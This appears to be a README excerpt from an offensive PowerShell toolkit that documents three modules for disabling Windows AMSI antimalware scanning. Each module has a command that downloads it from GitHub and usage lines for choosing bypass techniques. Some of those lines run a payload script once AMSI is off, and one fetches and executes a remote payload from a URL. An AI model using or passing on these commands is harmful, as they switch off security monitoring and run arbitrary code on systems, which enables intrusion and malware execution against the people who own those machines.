## Module Name
   <b><i>AMSBP.ps1</i></b>

|Function name|Description|Privileges|Notes|
|---|---|---|---|
|AMSBP|Disable AMSI within current process|User Land|\*\*\*|

```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-Bypass/AMSBP.ps1" -OutFile "AMSBP.ps1"
```

```powershell
Import-Module -Name .\AMSBP.ps1 -Force
AMSBP
```

<br />

## Module Name
   <b><i>Disable-Amsi.ps1</i></b>
   
|Function Name|Description|Privileges|Notes|
|---|---|---|---|
|Disable-Amsi|disable AMSI within current process using well<br />known techniques laid out in an unsignatured way</i></b>|User Land|4 bypass technics available|

```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-Bypass/Disable-Amsi.ps1" -OutFile "Disable-Amsi.ps1"
```

```powershell      
Import-Module -Name .\Disable-Amsi.ps1 -Force
Disable-Amsi -DontDisableBlockLogging
```   

<br />

## Module Name
   <b><i>Invoke-Bypass.ps1</i></b>
   
|Cmdlet Name|Description|Privileges|Notes|
|---|---|---|---|
|Invoke-Bypass|disable AMSI within current process using well<br />known techniques</i></b>|User Land|4 bypass technics available|

```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-Bypass/Invoke-Bypass.ps1" -OutFile "Invoke-Bypass.ps1"
```

```powershell      
.\Invoke-Bypass.ps1 -list "technic"
.\Invoke-Bypass.ps1 -technic "2"
.\Invoke-Bypass.ps1 -technic "3" -filepath "payload.ps1"
.\Invoke-Bypass.ps1 -technic "4" -filepath "payload.ps1" -fileargs "-action 'true'"
.\Invoke-Bypass.ps1 -technic "2" -payloadUrl "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/sysinfo.ps1" -fileargs "-sysinfo enum"
```   
